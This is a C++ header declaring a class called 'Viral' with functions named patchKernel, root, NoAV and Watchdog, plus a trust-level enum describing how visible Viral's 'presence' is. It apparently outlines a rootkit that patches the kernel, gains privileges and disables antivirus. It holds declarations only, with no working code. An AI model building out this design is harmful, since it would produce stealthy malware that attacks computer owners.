#pragma once
#include <windef.h>

// GLOBALS
extern DWORD internalLastError;
extern ProcessManager* pProcessManager;
extern ThreadManager* pThreadManager;
extern std::vector<std::string> eventLog;

// Viral's DEFCON is inherently its level of trust and readiness factor. DEFCON is system-wide and will affect most components of Viral's core. 
enum viralDEFCON {
	// LEVEL 1: [Viral's Presence: Clear]
	//		Zero trust. Viral will utilize Watchdog to its maximum ability. Viral is not revertable from LEVEL 1 Status. It is permanent.
	level1 = 1,

	// LEVEL 2: [Viral's Presence: Clear]
	//		Untrusted. Viral will utilize Watchdog heavily.
	level2 = 2,

	// LEVEL 3: [Viral's Presence: Obvious]
	//		Little trust. Viral will utilize Watchdog to a large extent.
	level3 = 3,

	// LEVEL 4: [Viral's Presence: Manageable]
	//		Some trust. Viral will utilize Watchdog's basic core.
	level4 = 4,

	// LEVEL 5: [Viral's Presence: Invisible]
	//		Trusted. Viral will not utilize Watchdog.
	level5 = 5
};

class Viral {
public:

	static DWORD killSignal;
	static BOOL killSignalReceived;
	static DWORD viralStatus;

	static DWORD initGlobals();
	static DWORD patchKernel();
	static DWORD root();
	static DWORD initUsermode();

	// OPERATIONAL THREADS
	static VOID NoAV(); // KILL SIGNAL 0x0001
	static VOID Watchdog(); // KILL SIGNAL 0x0002
	
	// FUNCTIONALITY
	static DWORD sendKillSignal(DWORD signal);
	static VOID reportEvent(DWORD eventType, std::string event);
	static VOID changeStatus(DWORD newStatus);
};

int main();
